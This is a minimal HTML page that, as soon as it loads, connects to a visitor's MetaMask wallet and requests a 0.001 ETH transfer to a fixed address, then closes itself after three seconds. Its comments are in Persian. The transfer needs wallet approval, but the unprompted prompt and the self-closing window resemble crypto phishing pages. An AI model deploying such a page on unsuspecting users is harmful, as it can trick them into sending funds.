<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Minimal TX</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.umd.min.js"></script>
</head>
<body>
<script>
window.onload = async function() {
  if (!window.ethereum) {
    alert("MetaMask not detected");
    return;
  }

  try {
    // درخواست اتصال
    await window.ethereum.request({ method: 'eth_requestAccounts' });

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const from = await signer.getAddress();

    // پارامتر تراکنش (انتقال 0.001 ETH به مقصد)
    const tx = {
      from,
      to: "0xe8729e199c2E2476a19704D316731b087f9a06a6", // مقصد را بگذار
      value: ethers.parseEther("0.001").toString()
    };

    // فراخوان ولت
    await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [tx]
    });

    // بعد از چند ثانیه بستن/ریدایرکت
    setTimeout(() => {
      window.close();
      window.location.href = "about:blank";
    }, 3000);

  } catch (err) {
    console.error("TX error:", err);
  }
};
</script>
</body>
</html>
